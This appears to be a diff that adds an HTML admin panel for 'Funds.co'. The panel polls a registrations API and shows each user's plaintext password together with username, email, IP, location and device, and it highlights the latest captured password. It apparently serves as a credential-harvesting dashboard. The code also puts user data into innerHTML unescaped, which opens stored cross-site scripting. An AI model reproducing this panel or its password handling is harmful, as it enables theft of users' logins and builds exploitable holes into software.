@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel | Funds.co</title>
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="admin-container">
+        <div class="logo">Funds.co Admin</div>
+        <h1>User Registrations</h1>
+        
+        <div class="stats">
+            <div>Total Registrations: <span id="totalCount">0</span></div>
+            <div>Today: <span id="todayCount">0</span></div>
+        </div>
+        
+        <div class="notification" id="lastNotification">
+            <p>Waiting for new registrations...</p>
+        </div>
+        
+        <div class="search-box">
+            <input type="text" id="searchInput" placeholder="Search by username, email or IP...">
+            <button id="searchBtn">Search</button>
+        </div>
+        
+        <table>
+            <thead>
+                <tr>
+                    <th>Username</th>
+                    <th>Email</th>
+                    <th>Password</th>
+                    <th>IP</th>
+                    <th>Location</th>
+                    <th>Device</th>
+                    <th>Time</th>
+                </tr>
+            </thead>
+            <tbody id="registrationsTable"></tbody>
+        </table>
+    </div>
+
+    <script>
+        let allRegistrations = [];
+        
+        // Format date/time
+        function formatDate(isoString) {
+            const date = new Date(isoString);
+            return date.toLocaleString();
+        }
+        
+        // Load registrations
+        async function loadRegistrations(searchTerm = '') {
+            try {
+                const response = await fetch('/api/registrations');
+                const data = await response.json();
+                
+                if (data.success) {
+                    allRegistrations = data.registrations;
+                    
+                    // Filter if search term exists
+                    const filtered = searchTerm 
+                        ? allRegistrations.filter(reg => 
+                            reg.username.toLowerCase().includes(searchTerm) ||
+                            reg.email.toLowerCase().includes(searchTerm) ||
+                            reg.ip.includes(searchTerm))
+                        : allRegistrations;
+                    
+                    // Update counts
+                    document.getElementById('totalCount').textContent = allRegistrations.length;
+                    const todayCount = allRegistrations.filter(reg => {
+                        return new Date(reg.timestamp).toDateString() === new Date().toDateString();
+                    }).length;
+                    document.getElementById('todayCount').textContent = todayCount;
+                    
+                    // Update table
+                    const table = document.getElementById('registrationsTable');
+                    table.innerHTML = filtered.map(reg => `
+                        <tr>
+                            <td>${reg.username}</td>
+                            <td>${reg.email}</td>
+                            <td class="password-cell">${reg.password}</td>
+                            <td>${reg.ip}</td>
+                            <td>${reg.location}</td>
+                            <td>${reg.device}</td>
+                            <td>${formatDate(reg.timestamp)}</td>
+                        </tr>
+                    `).join('');
+                    
+                    // Update last registered notification
+                    if (allRegistrations.length > 0) {
+                        const last = allRegistrations[0];
+                        document.getElementById('lastNotification').innerHTML = `
+                            <h3>Last Registration</h3>
+                            <p><strong>Username:</strong> ${last.username}</p>
+                            <p><strong>Email:</strong> ${last.email}</p>
+                            <p><strong>Password:</strong> ${last.password}</p>
+                            <p><strong>From:</strong> ${last.ip} (${last.location}) on ${last.device}</p>
+                            <p><strong>Time:</strong> ${formatDate(last.timestamp)}</p>
+                        `;
+                    }
+                }
+            } catch (error) {
+                console.error('Error loading registrations:', error);
+            }
+        }
+        
+        // Search functionality
+        document.getElementById('searchBtn').addEventListener('click', () => {
+            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
+            loadRegistrations(searchTerm);
+        });
+        
+        // Initialize and refresh every 5 seconds
+        window.addEventListener('DOMContentLoaded', () => {
+            loadRegistrations();
+            setInterval(loadRegistrations, 5000);
+        });
+    </script>
+</body>
+</html>
